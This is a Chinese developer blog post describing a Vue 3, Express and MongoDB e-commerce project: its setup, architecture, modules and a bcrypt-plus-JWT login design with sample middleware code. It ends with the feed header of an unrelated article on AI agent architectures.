<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b94bb22644546ac9c9686c0c2a66607~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=efGX7SDn%2BzvGIO8%2F9lme%2F4J092k%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/561adb95f05d465fac1f0ac8963493f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=Mb4f8Xg0BHUhJOcp%2F%2BF6ngrNAxI%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5707fbdbd78342a0b7693dcb9a605a11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=twUxs2X9%2FjVRlU6kShGSmHbE7jA%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba571d972aa944468ce4bebdd8f43905~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=5cczKd2xf6DrKWLbJV9JS89bwks%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93f1d22941064bb5a0bb1cb1a6b2d3d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=s9lOPGK3vRtTWBIVW0jE3kHQWC8%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf1c130f0b7744cbac50685dd30171ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=Adio6rEed416UWZQjjdLQQ3nW4s%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9df3bb9675f146eea4e5b2fdd9ea357a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=rXwDse9sGBODXiUEjxOMxLgs2lg%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1baade976da472d8993ae591ce5113f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=2ik7dZqZMlhzDsyvJi00xkp578k%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69567863dd1f45438325388eca73a696~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=HuhBo8XhLGh0YvJDlMkeBK410yQ%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6c2d17c66224eb8b06c0de2f4a42f81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=Wx4uvm7dSQzYIHTjr1lRvAMPomg%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/744bdac9b45840e99dd8d15f0dea8b0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=XdvkPmCA8n88iJoaX3%2FTtX1gGxI%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c45e6db68a94442b936ff40c70b5d065~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=37fwGm%2BHOI6mChLWFkeL6wknaQY%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/663bd8e249044bc48197dae384c58d0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=mH1akMYbxe%2B4oBqkAEB69PLL51U%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ce61ef6bef34f049032172b7b387cdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=2UCsrPAbra4jYPJohDm%2Bms6SM0k%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a1980db5e25422a8e1b5b6cbe8abf30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=x4588K%2FuqVMYm4iQuGJ2B3TrV98%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a37b3d2fa98451daaf83ff424bd4e56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=FqNm5heELkP%2F3UnSo1jKSL5AI8w%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/340323e9b682409b8006f317543a5671~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=qCsd6CnS5KECw5UIRJhKwHqCXjI%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac0b996f4b5e40c3baad2417437eb133~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=cqXcyoYOSpUw4%2FxRoMDeYC3wYhs%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/922a1acb49e4437da2e09ca25f87e190~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=sTnHMH5qACvnq8jUIkPCqjPTDuo%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2c010d6253d4829978fe51753c15fbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=pb5ESeLNvZopKzbEdj%2BIuBDH1u4%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bbbdc41e8af4117b76111e0039f15e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rip5pqW5YWo5qCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765614611&amp;x-signature=d2LG0EPEGF%2F2kEt%2FQgQ9iXZ%2FNyo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-3">2. 技术栈</h4>
<p><strong>前端</strong></p>
<ul>
<li>Vue 3 + TypeScript</li>
<li>Vue Router 4 (路由管理)</li>
<li>Pinia (状态管理)</li>
<li>Element UI Plus (UI组件库)</li>
<li>Axios (HTTP请求)</li>
</ul>
<p><strong>后端</strong></p>
<ul>
<li>Node.js + Express (服务器框架)</li>
<li>MongoDB + Mongoose (数据库)</li>
<li>JWT (身份验证)</li>
<li>Multer (文件上传)</li>
<li>Bcryptjs (密码加密)</li>
</ul>
<h3 data-id="heading-4">二、项目启动</h3>
<h4 data-id="heading-5">前置要求</h4>
<ul>
<li>Node.js &gt;= 16</li>
<li>pnpm &gt;= 8</li>
<li>MongoDB &gt;= 5.0</li>
</ul>
<h4 data-id="heading-6">1.安装依赖</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装根目录依赖</span>
pnpm install
</code></pre>
<h4 data-id="heading-7">2. 启动 MongoDB</h4>
<p>确保 MongoDB 服务已启动并运行在 <code>localhost:27017</code></p>
<h4 data-id="heading-8">3. 导入测试数据</h4>
<pre><code class="hljs language-arduino" lang="arduino">pnpm run <span class="hljs-keyword">import</span>
</code></pre>
<p>这将自动导入：</p>
<ul>
<li>✅ 4个测试用户（1个管理员 + 3个普通用户）</li>
<li>✅ 完整的商品分类体系</li>
<li>✅ 10个示例商品</li>
<li>✅ 用户地址数据</li>
<li>✅ 订单数据</li>
<li>✅ 社交帖子数据</li>
</ul>
<h4 data-id="heading-9">4. 启动开发服务器</h4>
<pre><code class="hljs language-arduino" lang="arduino">pnpm run dev
</code></pre>
<p>启动后访问：</p>
<ul>
<li>👤 用户系统：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A5173" target="_blank" title="http://localhost:5173" ref="nofollow noopener noreferrer">http://localhost:5173</a></li>
<li>🎛️ 管理系统：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A5174" target="_blank" title="http://localhost:5174" ref="nofollow noopener noreferrer">http://localhost:5174</a></li>
<li>🔗 后端API：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a></li>
</ul>
<h3 data-id="heading-10">三、项目总体设计</h3>
<h4 data-id="heading-11">1. 系统架构设计</h4>
<h5 data-id="heading-12">1.1 架构模式选择</h5>
<p>本系统采用前后端分离的架构模式，具有以下优势：</p>
<p><strong>1. 职责分离</strong></p>
<ul>
<li>前端专注于用户界面和交互体验</li>
<li>后端专注于业务逻辑和数据处理</li>
<li>前后端可以独立开发、测试、部署</li>
</ul>
<p><strong>2. 技术独立</strong></p>
<ul>
<li>前端可以选择最适合的框架和技术</li>
<li>后端可以选择最适合的语言和框架</li>
<li>技术栈升级互不影响</li>
</ul>
<p><strong>3. 团队协作</strong></p>
<ul>
<li>前端团队和后端团队可以并行开发</li>
<li>通过API接口约定进行协作</li>
<li>提高开发效率</li>
</ul>
<p><strong>4. 可扩展性</strong></p>
<ul>
<li>前端和后端可以独立扩展</li>
<li>支持多端应用（Web、移动端、小程序）</li>
<li>便于向微服务架构演进</li>
</ul>
<h5 data-id="heading-13">1.2 系统架构图</h5>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────┐
│                      客户端层                             │
│  ┌──────────────┐         ┌──────────────┐              │
│  │  用户系统     │         │  管理系统     │              │
│  │  (Vue <span class="hljs-number">3</span>)     │         │  (Vue <span class="hljs-number">3</span>)     │              │
│  └──────────────┘         └──────────────┘              │
└─────────────────────────────────────────────────────────┘
                          │
                          │ HTTP/HTTPS
                          │ RESTful API
                          ▼
┌─────────────────────────────────────────────────────────┐
│                      服务端层                             │
│  ┌──────────────────────────────────────────────────┐   │
│  │              Express 应用服务器                    │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐       │   │
│  │  │ 路由层    │  │ 中间件层  │  │ 控制器层  │       │   │
│  │  └──────────┘  └──────────┘  └──────────┘       │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
                          │
                          │ Mongoose ODM
                          ▼
┌─────────────────────────────────────────────────────────┐
│                      数据层                               │
│  ┌──────────────────────────────────────────────────┐   │
│  │              MongoDB 数据库                        │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐       │   │
│  │  │ 用户集合  │  │ 商品集合  │  │ 订单集合  │       │   │
│  │  └──────────┘  └──────────┘  └──────────┘       │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
</code></pre>
<h5 data-id="heading-14">1.3技术架构</h5>
<p><strong>前端架构</strong></p>
<pre><code class="hljs language-scss" lang="scss">用户系统 / 管理系统
├── Vue <span class="hljs-number">3</span> (核心框架)
├── TypeScript (类型系统)
├── Pinia (状态管理)
├── Vue Router (路由管理)
├── Element UI Plus (UI组件库)
├── Axios (HTTP客户端)
└── Vite (构建工具)
</code></pre>
<p><strong>后端架构</strong></p>
<pre><code class="hljs language-scss" lang="scss">API服务器
├── Node<span class="hljs-selector-class">.js</span> (运行环境)
├── Express (Web框架)
├── MongoDB (数据库)
├── Mongoose (ODM)
├── JWT (身份认证)
├── Bcrypt (密码加密)
└── Multer (文件上传)
</code></pre>
<h4 data-id="heading-15">2. 系统功能模块设计</h4>
<p><strong>用户购物系统功能模块</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">用户购物系统
├── 用户管理模块
│   ├── 用户注册
│   ├── 用户登录
│   ├── 个人信息管理
│   └── 收货地址管理
├── 商品展示模块
│   ├── 首页展示
│   ├── 商品列表
│   ├── 商品详情
│   └── 商品搜索
├── 购物功能模块
│   ├── 购物车管理
│   ├── 订单创建
│   ├── 订单查询
│   └── 订单评价
└── 社交功能模块
<span class="hljs-code">    ├── 动态发布
    ├── 动态浏览
    ├── 点赞评论
    └── 用户关注
</span></code></pre>
<p><strong>后台管理系统功能模块</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">后台管理系统
├── 系统概览模块
│   ├── 数据统计
│   ├── 销售图表
│   └── 订单统计
├── 商品管理模块
│   ├── 商品列表
│   ├── 商品编辑
│   ├── 分类管理
│   └── 库存管理
├── 订单管理模块
│   ├── 订单列表
│   ├── 订单详情
│   ├── 发货处理
│   └── 退款处理
├── 用户管理模块
│   ├── 用户列表
│   ├── 用户详情
│   └── 用户状态管理
└── 数据统计模块
<span class="hljs-code">    ├── 销售统计
    ├── 商品排行
    └── 用户分析
</span></code></pre>
<h4 data-id="heading-16">3. 数据库设计</h4>
<p>系统主要包含以下实体：</p>
<ol>
<li><strong>用户（User）</strong> ：存储用户基本信息和统计数据</li>
<li><strong>商品（Product）</strong> ：存储商品信息、价格、库存等</li>
<li><strong>订单（Order）</strong> ：存储订单详情、支付信息、物流状态</li>
<li><strong>动态（Post）</strong> ：存储用户发布的社交动态</li>
<li><strong>评论（Comment）</strong> ：存储动态评论信息</li>
<li><strong>地址（Address）</strong> ：存储用户收货地址</li>
</ol>
<p>实体关系：</p>
<ul>
<li>一个用户可以有多个订单（1:N）</li>
<li>一个订单包含多个商品（N:M）</li>
<li>一个用户可以发布多个动态（1:N）</li>
<li>一个动态可以有多个评论（1:N）</li>
<li>一个用户可以有多个收货地址（1:N）</li>
</ul>
<h3 data-id="heading-17">四、用户认证模块设计</h3>
<h4 data-id="heading-18">1. 功能流程图</h4>
<pre><code class="hljs">用户注册流程：
用户填写信息 → 前端验证 → 发送注册请求 → 后端验证 → 密码加密 → 
存入数据库 → 生成 Token → 返回用户信息和 Token → 前端存储 Token → 
自动登录 → 跳转首页

用户登录流程：
用户输入账号密码 → 前端验证 → 发送登录请求 → 后端查询用户 → 
验证密码 → 生成 Token → 返回用户信息和 Token → 前端存储 Token → 
跳转首页
</code></pre>
<p><strong>核心技术点：</strong></p>
<ol>
<li><strong>密码加密（bcrypt）</strong></li>
</ol>
<p>bcrypt 是一种专门为密码存储设计的哈希算法，具有以下特点：</p>
<ul>
<li><strong>加盐（Salt）</strong> ：自动生成随机盐值，防止彩虹表攻击</li>
<li><strong>慢速哈希</strong>：计算速度慢，增加暴力破解难度</li>
<li><strong>自适应</strong>：可调整计算复杂度，应对硬件性能提升</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 密码加密实现</span>
<span class="hljs-keyword">import</span> bcrypt <span class="hljs-keyword">from</span> <span class="hljs-string">'bcryptjs'</span>;

<span class="hljs-comment">// 注册时加密密码</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">hashPassword</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">password</span>) =&gt; {
  <span class="hljs-comment">// 生成盐值，10 是成本因子（cost factor）</span>
  <span class="hljs-comment">// 成本因子越高，计算越慢，安全性越高</span>
  <span class="hljs-keyword">const</span> salt = <span class="hljs-keyword">await</span> bcrypt.<span class="hljs-title function_">genSalt</span>(<span class="hljs-number">10</span>);
  
  <span class="hljs-comment">// 使用盐值加密密码</span>
  <span class="hljs-keyword">const</span> hashedPassword = <span class="hljs-keyword">await</span> bcrypt.<span class="hljs-title function_">hash</span>(password, salt);
  
  <span class="hljs-keyword">return</span> hashedPassword;
};

<span class="hljs-comment">// 登录时验证密码</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">verifyPassword</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">inputPassword, storedPassword</span>) =&gt; {
  <span class="hljs-comment">// bcrypt.compare 会自动提取盐值进行比较</span>
  <span class="hljs-keyword">const</span> isMatch = <span class="hljs-keyword">await</span> bcrypt.<span class="hljs-title function_">compare</span>(inputPassword, storedPassword);
  
  <span class="hljs-keyword">return</span> isMatch;
};
</code></pre>
<p><strong>为什么不使用 MD5 或 SHA？</strong></p>
<ul>
<li>MD5 和 SHA 是快速哈希算法，容易被暴力破解</li>
<li>没有内置盐值机制，需要手动实现</li>
<li>bcrypt 专为密码设计，更安全</li>
</ul>
<h4 data-id="heading-19">2. JWT 身份认证</h4>
<p>JWT（JSON Web Token）是一种无状态的身份认证方案，特别适合前后端分离架构。</p>
<p><strong>JWT 结构：</strong></p>
<pre><code class="hljs language-json" lang="json">JWT = Header.Payload.Signature

Header（头部）：
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"alg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"HS256"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 签名算法</span>
  <span class="hljs-attr">"typ"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"JWT"</span>     <span class="hljs-comment">// Token 类型</span>
<span class="hljs-punctuation">}</span>

Payload（载荷）：
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"userId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"64f8a1b2c3d4e5f6a7b8c9d0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"testuser"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"user"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"iat"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1704067200</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 签发时间</span>
  <span class="hljs-attr">"exp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1704672000</span>   <span class="hljs-comment">// 过期时间</span>
<span class="hljs-punctuation">}</span>

Signature（签名）：
HMACSHA256(
  base64UrlEncode(header) + <span class="hljs-string">"."</span> + base64UrlEncode(payload)<span class="hljs-punctuation">,</span>
  secret
)
</code></pre>
<p><strong>JWT 工作流程：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 用户登录成功
   ↓
<span class="hljs-bullet">2.</span> 服务器生成 JWT Token
<span class="hljs-bullet">   -</span> 将用户信息编码到 Payload
<span class="hljs-bullet">   -</span> 使用密钥签名，防止篡改
   ↓
<span class="hljs-bullet">3.</span> 返回 Token 给客户端
   ↓
<span class="hljs-bullet">4.</span> 客户端存储 Token（localStorage 或 sessionStorage）
   ↓
<span class="hljs-bullet">5.</span> 后续请求携带 Token
<span class="hljs-bullet">   -</span> 在 HTTP Header 中添加：Authorization: Bearer <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">token</span>&gt;</span></span>
   ↓
<span class="hljs-bullet">6.</span> 服务器验证 Token
<span class="hljs-bullet">   -</span> 验证签名是否有效
<span class="hljs-bullet">   -</span> 检查是否过期
<span class="hljs-bullet">   -</span> 提取用户信息
   ↓
<span class="hljs-bullet">7.</span> 处理业务逻辑
</code></pre>
<p><strong>JWT 实现代码：</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> jwt <span class="hljs-keyword">from</span> <span class="hljs-string">'jsonwebtoken'</span>;

<span class="hljs-comment">// 密钥（生产环境应使用环境变量）</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">JWT_SECRET</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">JWT_SECRET</span> || <span class="hljs-string">'your-secret-key'</span>;

<span class="hljs-comment">// 生成 Token</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">generateToken</span> = (<span class="hljs-params">user</span>) =&gt; {
  <span class="hljs-keyword">const</span> payload = {
    <span class="hljs-attr">userId</span>: user.<span class="hljs-property">_id</span>,
    <span class="hljs-attr">username</span>: user.<span class="hljs-property">username</span>,
    <span class="hljs-attr">role</span>: user.<span class="hljs-property">role</span>
  };
  
  <span class="hljs-comment">// 签发 Token，设置 7 天过期</span>
  <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(payload, <span class="hljs-variable constant_">JWT_SECRET</span>, {
    <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">'7d'</span>
  });
  
  <span class="hljs-keyword">return</span> token;
};

<span class="hljs-comment">// 验证 Token 中间件</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">authenticateToken</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">req, res, next</span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 从请求头获取 Token</span>
    <span class="hljs-keyword">const</span> authHeader = req.<span class="hljs-property">headers</span>.<span class="hljs-property">authorization</span>;
    <span class="hljs-keyword">const</span> token = authHeader &amp;&amp; authHeader.<span class="hljs-title function_">split</span>(<span class="hljs-string">' '</span>)[<span class="hljs-number">1</span>]; <span class="hljs-comment">// Bearer &lt;token&gt;</span>
    
    <span class="hljs-keyword">if</span> (!token) {
      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>({
        <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">message</span>: <span class="hljs-string">'访问令牌缺失'</span>
      });
    }
    
    <span class="hljs-comment">// 验证 Token</span>
    <span class="hljs-keyword">const</span> decoded = jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">JWT_SECRET</span>);
    
    <span class="hljs-comment">// 查询用户是否存在且状态正常</span>
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title class_">User</span>.<span class="hljs-title function_">findById</span>(decoded.<span class="hljs-property">userId</span>);
    <span class="hljs-keyword">if</span> (!user || user.<span class="hljs-property">status</span> !== <span class="hljs-string">'active'</span>) {
      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>({
        <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">message</span>: <span class="hljs-string">'用户不存在或已被禁用'</span>
      });
    }
    
    <span class="hljs-comment">// 将用户信息附加到请求对象</span>
    req.<span class="hljs-property">user</span> = {
      <span class="hljs-attr">userId</span>: decoded.<span class="hljs-property">userId</span>,
      <span class="hljs-attr">username</span>: decoded.<span class="hljs-property">username</span>,
      <span class="hljs-attr">role</span>: decoded.<span class="hljs-property">role</span>
    };
    
    <span class="hljs-title function_">next</span>();
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> === <span class="hljs-string">'TokenExpiredError'</span>) {
      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>({
        <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">message</span>: <span class="hljs-string">'令牌已过期，请重新登录'</span>
      });
    }
    
    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>({
      <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-string">'无效的访问令牌'</span>
    });
  }
};
</code></pre>
<p><strong>JWT vs Session 对比：</strong></p>



































<table><thead><tr><th>特性</th><th>JWT</th><th>Session</th></tr></thead><tbody><tr><td>存储位置</td><td>客户端</td><td>服务器</td></tr><tr><td>扩展性</td><td>好（无状态）</td><td>差（需要共享 Session）</td></tr><tr><td>性能</td><td>好（无需查询）</td><td>一般（需要查询 Session）</td></tr><tr><td>安全性</td><td>一般（Token 泄露风险）</td><td>好（服务器控制）</td></tr><tr><td>适用场景</td><td>前后端分离、微服务</td><td>传统 Web 应用</td></tr></tbody></table>
<p><strong>JWT 安全注意事项：</strong></p>
<ol>
<li>不要在 Payload 中存储敏感信息（密码、信用卡号等）</li>
<li>使用 HTTPS 传输，防止 Token 被窃取</li>
<li>设置合理的过期时间</li>
<li>实现 Token 刷新机制</li>
<li>考虑使用 Refresh Token 提升安全性</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一文看懂AI智能体架构：工程师依赖的8种LLM，到底怎么分工？]]></title>    <link>https://juejin.cn/post/7580282751628017705</link>    <guid>https://juejin.cn/post/7580282751628017705</guid>    <pubDate>2025-12-06T08:45:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580282751628017705" data-draft-id="7580297762189803561" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一文看懂AI智能体架构：工程师依赖的8种LLM，到底怎么分工？"/> <meta itemprop="keywords" content="后端,算法,LLM"/> <meta itemprop="datePublished" content="2025-12-06T08:45:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MobotStone"/> <meta itemprop="url" content="https://juejin.cn/user/3839909554568840"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一文看懂AI智能体架构：工程师依赖的8种LLM，到底怎么分工？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3839909554568840/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MobotStone
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T08:45:29.000Z" title="Sat Dec 06 2025 08:45:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
